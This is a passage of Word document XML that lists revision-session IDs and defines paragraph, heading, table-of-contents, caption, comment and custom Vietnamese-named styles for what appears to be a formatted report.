    <w:rsid w:val="00AE1D2E"/>
    <w:rsid w:val="00AE31A5"/>
    <w:rsid w:val="00AE37F9"/>
    <w:rsid w:val="00AE3F1D"/>
    <w:rsid w:val="00AE7570"/>
    <w:rsid w:val="00AF3BF3"/>
    <w:rsid w:val="00AF3D82"/>
    <w:rsid w:val="00AF48E2"/>
    <w:rsid w:val="00AF5019"/>
    <w:rsid w:val="00AF79CD"/>
    <w:rsid w:val="00B0002D"/>
    <w:rsid w:val="00B03C37"/>
    <w:rsid w:val="00B069DE"/>
    <w:rsid w:val="00B07F81"/>
    <w:rsid w:val="00B104D1"/>
    <w:rsid w:val="00B113CC"/>
    <w:rsid w:val="00B144E5"/>
    <w:rsid w:val="00B16C1A"/>
    <w:rsid w:val="00B17757"/>
    <w:rsid w:val="00B17E4F"/>
    <w:rsid w:val="00B17F5C"/>
    <w:rsid w:val="00B2183C"/>
    <w:rsid w:val="00B220DF"/>
    <w:rsid w:val="00B23E11"/>
    <w:rsid w:val="00B2433C"/>
    <w:rsid w:val="00B24615"/>
    <w:rsid w:val="00B246D7"/>
    <w:rsid w:val="00B269CA"/>
    <w:rsid w:val="00B279FA"/>
    <w:rsid w:val="00B31357"/>
    <w:rsid w:val="00B316A5"/>
    <w:rsid w:val="00B3353C"/>
    <w:rsid w:val="00B335CF"/>
    <w:rsid w:val="00B35C3A"/>
    <w:rsid w:val="00B35E0D"/>
    <w:rsid w:val="00B42970"/>
    <w:rsid w:val="00B43F70"/>
    <w:rsid w:val="00B449DB"/>
    <w:rsid w:val="00B47649"/>
    <w:rsid w:val="00B529DF"/>
    <w:rsid w:val="00B52ED5"/>
    <w:rsid w:val="00B54494"/>
    <w:rsid w:val="00B54E6C"/>
    <w:rsid w:val="00B610DD"/>
    <w:rsid w:val="00B64514"/>
    <w:rsid w:val="00B6528C"/>
    <w:rsid w:val="00B65B66"/>
    <w:rsid w:val="00B70C7F"/>
    <w:rsid w:val="00B81D53"/>
    <w:rsid w:val="00B836A5"/>
    <w:rsid w:val="00B83717"/>
    <w:rsid w:val="00B8447B"/>
    <w:rsid w:val="00B845B3"/>
    <w:rsid w:val="00B8463C"/>
    <w:rsid w:val="00B84794"/>
    <w:rsid w:val="00B8599A"/>
    <w:rsid w:val="00B86498"/>
    <w:rsid w:val="00B86DBF"/>
    <w:rsid w:val="00B87B4D"/>
    <w:rsid w:val="00B93785"/>
    <w:rsid w:val="00B93BE1"/>
    <w:rsid w:val="00B93CD6"/>
    <w:rsid w:val="00B95DE1"/>
    <w:rsid w:val="00B95E02"/>
    <w:rsid w:val="00B973C5"/>
    <w:rsid w:val="00B9767C"/>
    <w:rsid w:val="00B97FA2"/>
    <w:rsid w:val="00BA0D75"/>
    <w:rsid w:val="00BA2D32"/>
    <w:rsid w:val="00BA4D0F"/>
    <w:rsid w:val="00BA6734"/>
    <w:rsid w:val="00BA74A4"/>
    <w:rsid w:val="00BB1158"/>
    <w:rsid w:val="00BB287D"/>
    <w:rsid w:val="00BB29BD"/>
    <w:rsid w:val="00BB4115"/>
    <w:rsid w:val="00BC0609"/>
    <w:rsid w:val="00BC0B44"/>
    <w:rsid w:val="00BC16B1"/>
    <w:rsid w:val="00BC1EAD"/>
    <w:rsid w:val="00BC2B5C"/>
    <w:rsid w:val="00BC402C"/>
    <w:rsid w:val="00BC40D6"/>
    <w:rsid w:val="00BC4456"/>
    <w:rsid w:val="00BC65F6"/>
    <w:rsid w:val="00BC7C00"/>
    <w:rsid w:val="00BD6461"/>
    <w:rsid w:val="00BE4B52"/>
    <w:rsid w:val="00BE5754"/>
    <w:rsid w:val="00BF06B7"/>
    <w:rsid w:val="00BF0A5E"/>
    <w:rsid w:val="00BF0F75"/>
    <w:rsid w:val="00BF124A"/>
    <w:rsid w:val="00BF2242"/>
    <w:rsid w:val="00BF2BA3"/>
    <w:rsid w:val="00BF37B9"/>
    <w:rsid w:val="00BF4E98"/>
    <w:rsid w:val="00BF5BEC"/>
    <w:rsid w:val="00BF5FB1"/>
    <w:rsid w:val="00BF6C39"/>
    <w:rsid w:val="00C004A9"/>
    <w:rsid w:val="00C026CC"/>
    <w:rsid w:val="00C03DAA"/>
    <w:rsid w:val="00C10026"/>
    <w:rsid w:val="00C10738"/>
    <w:rsid w:val="00C1227E"/>
    <w:rsid w:val="00C12AFC"/>
    <w:rsid w:val="00C15C7A"/>
    <w:rsid w:val="00C166CB"/>
    <w:rsid w:val="00C16909"/>
    <w:rsid w:val="00C17023"/>
    <w:rsid w:val="00C17C69"/>
    <w:rsid w:val="00C17EBE"/>
    <w:rsid w:val="00C2012E"/>
    <w:rsid w:val="00C2021D"/>
    <w:rsid w:val="00C219F3"/>
    <w:rsid w:val="00C22CF5"/>
    <w:rsid w:val="00C2388E"/>
    <w:rsid w:val="00C24607"/>
    <w:rsid w:val="00C251F9"/>
    <w:rsid w:val="00C25F7E"/>
    <w:rsid w:val="00C262DD"/>
    <w:rsid w:val="00C26F90"/>
    <w:rsid w:val="00C2783B"/>
    <w:rsid w:val="00C310C3"/>
    <w:rsid w:val="00C31578"/>
    <w:rsid w:val="00C31AAC"/>
    <w:rsid w:val="00C320EF"/>
    <w:rsid w:val="00C33879"/>
    <w:rsid w:val="00C3420A"/>
    <w:rsid w:val="00C34B1D"/>
    <w:rsid w:val="00C3597D"/>
    <w:rsid w:val="00C368DE"/>
    <w:rsid w:val="00C36E64"/>
    <w:rsid w:val="00C4181B"/>
    <w:rsid w:val="00C43533"/>
    <w:rsid w:val="00C43FBD"/>
    <w:rsid w:val="00C44E0B"/>
    <w:rsid w:val="00C45235"/>
    <w:rsid w:val="00C454F5"/>
    <w:rsid w:val="00C45B50"/>
    <w:rsid w:val="00C54BB8"/>
    <w:rsid w:val="00C5730C"/>
    <w:rsid w:val="00C60C86"/>
    <w:rsid w:val="00C61182"/>
    <w:rsid w:val="00C61D8F"/>
    <w:rsid w:val="00C627EB"/>
    <w:rsid w:val="00C64F68"/>
    <w:rsid w:val="00C66418"/>
    <w:rsid w:val="00C67523"/>
    <w:rsid w:val="00C7219E"/>
    <w:rsid w:val="00C72AFC"/>
    <w:rsid w:val="00C7709D"/>
    <w:rsid w:val="00C8265C"/>
    <w:rsid w:val="00C82B07"/>
    <w:rsid w:val="00C82BBD"/>
    <w:rsid w:val="00C82CB6"/>
    <w:rsid w:val="00C8457B"/>
    <w:rsid w:val="00C85307"/>
    <w:rsid w:val="00C863CF"/>
    <w:rsid w:val="00C87075"/>
    <w:rsid w:val="00C87F29"/>
    <w:rsid w:val="00C9135E"/>
    <w:rsid w:val="00C923CF"/>
    <w:rsid w:val="00C944DF"/>
    <w:rsid w:val="00C965AB"/>
    <w:rsid w:val="00C96D00"/>
    <w:rsid w:val="00C977C4"/>
    <w:rsid w:val="00CA08E5"/>
    <w:rsid w:val="00CA392F"/>
    <w:rsid w:val="00CA7A2A"/>
    <w:rsid w:val="00CB2630"/>
    <w:rsid w:val="00CB34D1"/>
    <w:rsid w:val="00CB3974"/>
    <w:rsid w:val="00CB5023"/>
    <w:rsid w:val="00CB7C4E"/>
    <w:rsid w:val="00CC0268"/>
    <w:rsid w:val="00CC1BBD"/>
    <w:rsid w:val="00CC2714"/>
    <w:rsid w:val="00CC388C"/>
    <w:rsid w:val="00CC3C07"/>
    <w:rsid w:val="00CC557B"/>
    <w:rsid w:val="00CC6822"/>
    <w:rsid w:val="00CC7281"/>
    <w:rsid w:val="00CC7B83"/>
    <w:rsid w:val="00CD209C"/>
    <w:rsid w:val="00CD2159"/>
    <w:rsid w:val="00CD62F5"/>
    <w:rsid w:val="00CD6BAB"/>
    <w:rsid w:val="00CD6F0F"/>
    <w:rsid w:val="00CE2381"/>
    <w:rsid w:val="00CE39A3"/>
    <w:rsid w:val="00CE4744"/>
    <w:rsid w:val="00CE4FBA"/>
    <w:rsid w:val="00CE570D"/>
    <w:rsid w:val="00CF29E8"/>
    <w:rsid w:val="00CF2B48"/>
    <w:rsid w:val="00CF4D51"/>
    <w:rsid w:val="00D00D79"/>
    <w:rsid w:val="00D00E3D"/>
    <w:rsid w:val="00D038FA"/>
    <w:rsid w:val="00D05CAE"/>
    <w:rsid w:val="00D05E9C"/>
    <w:rsid w:val="00D05F95"/>
    <w:rsid w:val="00D11181"/>
    <w:rsid w:val="00D11694"/>
    <w:rsid w:val="00D13221"/>
    <w:rsid w:val="00D134F1"/>
    <w:rsid w:val="00D13A29"/>
    <w:rsid w:val="00D14A1D"/>
    <w:rsid w:val="00D159C2"/>
    <w:rsid w:val="00D17A16"/>
    <w:rsid w:val="00D22C9A"/>
    <w:rsid w:val="00D247BC"/>
    <w:rsid w:val="00D260E2"/>
    <w:rsid w:val="00D309B3"/>
    <w:rsid w:val="00D341BB"/>
    <w:rsid w:val="00D35692"/>
    <w:rsid w:val="00D35CCC"/>
    <w:rsid w:val="00D360D1"/>
    <w:rsid w:val="00D36389"/>
    <w:rsid w:val="00D36C10"/>
    <w:rsid w:val="00D40574"/>
    <w:rsid w:val="00D42911"/>
    <w:rsid w:val="00D45A66"/>
    <w:rsid w:val="00D47B7B"/>
    <w:rsid w:val="00D5033E"/>
    <w:rsid w:val="00D55D72"/>
    <w:rsid w:val="00D567ED"/>
    <w:rsid w:val="00D73C25"/>
    <w:rsid w:val="00D73FC9"/>
    <w:rsid w:val="00D75E85"/>
    <w:rsid w:val="00D769DB"/>
    <w:rsid w:val="00D76C52"/>
    <w:rsid w:val="00D779DD"/>
    <w:rsid w:val="00D81D1C"/>
    <w:rsid w:val="00D82D21"/>
    <w:rsid w:val="00D83BE6"/>
    <w:rsid w:val="00D84378"/>
    <w:rsid w:val="00D84F72"/>
    <w:rsid w:val="00D872BB"/>
    <w:rsid w:val="00D87DBB"/>
    <w:rsid w:val="00D90248"/>
    <w:rsid w:val="00D9045C"/>
    <w:rsid w:val="00D90843"/>
    <w:rsid w:val="00D925E6"/>
    <w:rsid w:val="00D92CD3"/>
    <w:rsid w:val="00D93674"/>
    <w:rsid w:val="00D94422"/>
    <w:rsid w:val="00D94780"/>
    <w:rsid w:val="00D96443"/>
    <w:rsid w:val="00D96B2E"/>
    <w:rsid w:val="00DA0592"/>
    <w:rsid w:val="00DA1C75"/>
    <w:rsid w:val="00DA1FBE"/>
    <w:rsid w:val="00DA38CC"/>
    <w:rsid w:val="00DA3A5E"/>
    <w:rsid w:val="00DA4026"/>
    <w:rsid w:val="00DA4310"/>
    <w:rsid w:val="00DA6DF5"/>
    <w:rsid w:val="00DA714D"/>
    <w:rsid w:val="00DB4846"/>
    <w:rsid w:val="00DC0045"/>
    <w:rsid w:val="00DC2872"/>
    <w:rsid w:val="00DC2E45"/>
    <w:rsid w:val="00DC3735"/>
    <w:rsid w:val="00DC42C0"/>
    <w:rsid w:val="00DC50F9"/>
    <w:rsid w:val="00DC6938"/>
    <w:rsid w:val="00DC6F60"/>
    <w:rsid w:val="00DC70D3"/>
    <w:rsid w:val="00DD1A4E"/>
    <w:rsid w:val="00DD27CC"/>
    <w:rsid w:val="00DD3CFA"/>
    <w:rsid w:val="00DD7BD0"/>
    <w:rsid w:val="00DD7E08"/>
    <w:rsid w:val="00DE0BDC"/>
    <w:rsid w:val="00DE21AD"/>
    <w:rsid w:val="00DE2CF6"/>
    <w:rsid w:val="00DE5494"/>
    <w:rsid w:val="00DE6121"/>
    <w:rsid w:val="00DE6858"/>
    <w:rsid w:val="00DE779D"/>
    <w:rsid w:val="00DE7EB8"/>
    <w:rsid w:val="00DF21FA"/>
    <w:rsid w:val="00DF3FC8"/>
    <w:rsid w:val="00DF648E"/>
    <w:rsid w:val="00DF7D1E"/>
    <w:rsid w:val="00E02185"/>
    <w:rsid w:val="00E02DA0"/>
    <w:rsid w:val="00E06CC2"/>
    <w:rsid w:val="00E0790D"/>
    <w:rsid w:val="00E1067A"/>
    <w:rsid w:val="00E11277"/>
    <w:rsid w:val="00E11294"/>
    <w:rsid w:val="00E11ED6"/>
    <w:rsid w:val="00E1477A"/>
    <w:rsid w:val="00E14C9F"/>
    <w:rsid w:val="00E206FD"/>
    <w:rsid w:val="00E21EA1"/>
    <w:rsid w:val="00E22EFE"/>
    <w:rsid w:val="00E2610F"/>
    <w:rsid w:val="00E27041"/>
    <w:rsid w:val="00E27AA9"/>
    <w:rsid w:val="00E334C9"/>
    <w:rsid w:val="00E34B1E"/>
    <w:rsid w:val="00E34E12"/>
    <w:rsid w:val="00E34FCD"/>
    <w:rsid w:val="00E36181"/>
    <w:rsid w:val="00E37554"/>
    <w:rsid w:val="00E37602"/>
    <w:rsid w:val="00E37D0C"/>
    <w:rsid w:val="00E37E04"/>
    <w:rsid w:val="00E44579"/>
    <w:rsid w:val="00E447F7"/>
    <w:rsid w:val="00E465E9"/>
    <w:rsid w:val="00E467A1"/>
    <w:rsid w:val="00E502B2"/>
    <w:rsid w:val="00E519AF"/>
    <w:rsid w:val="00E51F7D"/>
    <w:rsid w:val="00E53B4C"/>
    <w:rsid w:val="00E56D48"/>
    <w:rsid w:val="00E640C4"/>
    <w:rsid w:val="00E6472F"/>
    <w:rsid w:val="00E713E7"/>
    <w:rsid w:val="00E767AB"/>
    <w:rsid w:val="00E769DA"/>
    <w:rsid w:val="00E7754F"/>
    <w:rsid w:val="00E81C97"/>
    <w:rsid w:val="00E825C6"/>
    <w:rsid w:val="00E82BBF"/>
    <w:rsid w:val="00E83E67"/>
    <w:rsid w:val="00E84E7E"/>
    <w:rsid w:val="00E85203"/>
    <w:rsid w:val="00E85EDF"/>
    <w:rsid w:val="00E8729B"/>
    <w:rsid w:val="00E916A2"/>
    <w:rsid w:val="00E934B9"/>
    <w:rsid w:val="00E93610"/>
    <w:rsid w:val="00E94C3D"/>
    <w:rsid w:val="00E975E6"/>
    <w:rsid w:val="00EA352F"/>
    <w:rsid w:val="00EA3BF8"/>
    <w:rsid w:val="00EA5208"/>
    <w:rsid w:val="00EB2734"/>
    <w:rsid w:val="00EB2D20"/>
    <w:rsid w:val="00EB4088"/>
    <w:rsid w:val="00EB6270"/>
    <w:rsid w:val="00EB6F96"/>
    <w:rsid w:val="00EC1FE1"/>
    <w:rsid w:val="00EC2BD5"/>
    <w:rsid w:val="00EC4274"/>
    <w:rsid w:val="00EC5F0B"/>
    <w:rsid w:val="00EC75CA"/>
    <w:rsid w:val="00ED29EB"/>
    <w:rsid w:val="00ED3431"/>
    <w:rsid w:val="00ED3BC2"/>
    <w:rsid w:val="00ED499C"/>
    <w:rsid w:val="00ED50C4"/>
    <w:rsid w:val="00ED5783"/>
    <w:rsid w:val="00ED7A1C"/>
    <w:rsid w:val="00EE0300"/>
    <w:rsid w:val="00EE2422"/>
    <w:rsid w:val="00EE2C08"/>
    <w:rsid w:val="00EE43A2"/>
    <w:rsid w:val="00EE4593"/>
    <w:rsid w:val="00EE50A3"/>
    <w:rsid w:val="00EE539C"/>
    <w:rsid w:val="00EE548F"/>
    <w:rsid w:val="00EE7877"/>
    <w:rsid w:val="00EF0889"/>
    <w:rsid w:val="00EF26FB"/>
    <w:rsid w:val="00EF3FC3"/>
    <w:rsid w:val="00EF4972"/>
    <w:rsid w:val="00EF566C"/>
    <w:rsid w:val="00EF5C12"/>
    <w:rsid w:val="00EF61D2"/>
    <w:rsid w:val="00F002E0"/>
    <w:rsid w:val="00F01E0B"/>
    <w:rsid w:val="00F01F61"/>
    <w:rsid w:val="00F026CD"/>
    <w:rsid w:val="00F03259"/>
    <w:rsid w:val="00F05683"/>
    <w:rsid w:val="00F06360"/>
    <w:rsid w:val="00F07EF6"/>
    <w:rsid w:val="00F113AF"/>
    <w:rsid w:val="00F13ED6"/>
    <w:rsid w:val="00F14542"/>
    <w:rsid w:val="00F15744"/>
    <w:rsid w:val="00F2370F"/>
    <w:rsid w:val="00F2384C"/>
    <w:rsid w:val="00F24BF6"/>
    <w:rsid w:val="00F24EE7"/>
    <w:rsid w:val="00F25405"/>
    <w:rsid w:val="00F2622B"/>
    <w:rsid w:val="00F2782F"/>
    <w:rsid w:val="00F30F59"/>
    <w:rsid w:val="00F316E5"/>
    <w:rsid w:val="00F32397"/>
    <w:rsid w:val="00F3268E"/>
    <w:rsid w:val="00F32AB7"/>
    <w:rsid w:val="00F3581E"/>
    <w:rsid w:val="00F358B3"/>
    <w:rsid w:val="00F360A7"/>
    <w:rsid w:val="00F40827"/>
    <w:rsid w:val="00F440BB"/>
    <w:rsid w:val="00F447B0"/>
    <w:rsid w:val="00F50604"/>
    <w:rsid w:val="00F524D7"/>
    <w:rsid w:val="00F57EDA"/>
    <w:rsid w:val="00F609FE"/>
    <w:rsid w:val="00F63E8A"/>
    <w:rsid w:val="00F64E57"/>
    <w:rsid w:val="00F66DE4"/>
    <w:rsid w:val="00F70503"/>
    <w:rsid w:val="00F7050B"/>
    <w:rsid w:val="00F72331"/>
    <w:rsid w:val="00F7407C"/>
    <w:rsid w:val="00F8096B"/>
    <w:rsid w:val="00F81A1A"/>
    <w:rsid w:val="00F81CD6"/>
    <w:rsid w:val="00F83D35"/>
    <w:rsid w:val="00F87311"/>
    <w:rsid w:val="00F91439"/>
    <w:rsid w:val="00F930A1"/>
    <w:rsid w:val="00F94F94"/>
    <w:rsid w:val="00F960F5"/>
    <w:rsid w:val="00F96BBD"/>
    <w:rsid w:val="00F97BA8"/>
    <w:rsid w:val="00FA233F"/>
    <w:rsid w:val="00FA3A12"/>
    <w:rsid w:val="00FA3A75"/>
    <w:rsid w:val="00FA4AB1"/>
    <w:rsid w:val="00FA6320"/>
    <w:rsid w:val="00FA6E6C"/>
    <w:rsid w:val="00FA71B8"/>
    <w:rsid w:val="00FB0840"/>
    <w:rsid w:val="00FB1B04"/>
    <w:rsid w:val="00FB26A2"/>
    <w:rsid w:val="00FB2725"/>
    <w:rsid w:val="00FB57EA"/>
    <w:rsid w:val="00FC1332"/>
    <w:rsid w:val="00FC3058"/>
    <w:rsid w:val="00FC3354"/>
    <w:rsid w:val="00FC465A"/>
    <w:rsid w:val="00FC5154"/>
    <w:rsid w:val="00FC5FE1"/>
    <w:rsid w:val="00FC7B46"/>
    <w:rsid w:val="00FC7BA6"/>
    <w:rsid w:val="00FC7BD2"/>
    <w:rsid w:val="00FD006A"/>
    <w:rsid w:val="00FD0E1F"/>
    <w:rsid w:val="00FD11F7"/>
    <w:rsid w:val="00FD2AE8"/>
    <w:rsid w:val="00FD4626"/>
    <w:rsid w:val="00FD5C50"/>
    <w:rsid w:val="00FD6B7B"/>
    <w:rsid w:val="00FD7135"/>
    <w:rsid w:val="00FE1546"/>
    <w:rsid w:val="00FE224E"/>
    <w:rsid w:val="00FE324C"/>
    <w:rsid w:val="00FE3F11"/>
    <w:rsid w:val="00FE4235"/>
    <w:rsid w:val="00FF0B7D"/>
    <w:rsid w:val="00FF3707"/>
    <w:rsid w:val="00FF46C4"/>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BFE15"/>
  <w15:docId w15:val="{4730BA8F-FE22-4DE1-B3FE-1E6D4DDF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7AB"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120" w:line="288" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00FB0840"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="600"/>
      <w:ind w:left="284" w:right="284"/>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840"/>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8"/>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8"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00746169"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:leader="dot" w:pos="9061"/>
      </w:tabs>
      <w:spacing w:before="180" w:after="60" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="0091295F"/>
    <w:pPr>
      <w:spacing w:before="180" w:after="60" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="288"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:i/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>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1B52BE"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:color w:val="auto"/>
      <w:sz w:val="28"/>
      <w:u w:val="none"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="CaptionChar"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00F440BB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:i/>
      <w:szCs w:val="2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autoRedefine/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00301F13"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="17"/>
      </w:numPr>
      <w:ind w:left="993"/>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customStyle="1" w:styleId="TrangBa">
    <w:name w:val="Trang Bìa"/>
    <w:qFormat/>
    <w:rsid w:val="00517338"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Calibri" w:hAnsi="Times New Roman" w:cs="Cordia New"/>
      <w:kern w:val="0"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-AU" w:eastAsia="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="001B38D3"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Table-Center">
    <w:name w:val="Table-Center"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="001B38D3"/>
    <w:pPr>
      <w:spacing w:before="60" w:after="60" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
      <w:kern w:val="0"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-AU" w:eastAsia="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="TableGrid1">
    <w:name w:val="Table Grid1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:next w:val="TableGrid"/>
    <w:uiPriority w:val="59"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0036465C"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Times New Roman"/>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465C"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0036465C"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:firstLine="709"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
      <w:kern w:val="0"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="25"/>
      <w:lang w:val="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="0036465C"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Calibri" w:hAnsi="Times New Roman" w:cs="Cordia New"/>
      <w:kern w:val="0"/>
      <w:szCs w:val="25"/>
      <w:lang w:val="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Tntiliuthamkho">
    <w:name w:val="Tên tài liệu tham khảo"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:i/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Tiliuthamkho">
    <w:name w:val="Tài liệu tham khảo"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
      <w:ind w:left="567" w:hanging="567"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
      <w:kern w:val="0"/>
      <w:szCs w:val="28"/>
      <w:lang w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Mclc">
    <w:name w:val="Mục lục"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="120" w:line="312" w:lineRule="auto"/>
      <w:ind w:right="567"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Angsana New"/>
      <w:caps/>
      <w:kern w:val="0"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="35"/>
      <w:lang w:val="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="nhsmc">
    <w:name w:val="Đánh số đề mục"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="5"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DCCT-Level2">
    <w:name w:val="DCCT-Level2"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
      <w:i/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DCCT-Level1">
    <w:name w:val="DCCT-Level1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="DCCT-Level2"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
      <w:b/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DCCT-Level3">
    <w:name w:val="DCCT-Level3"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
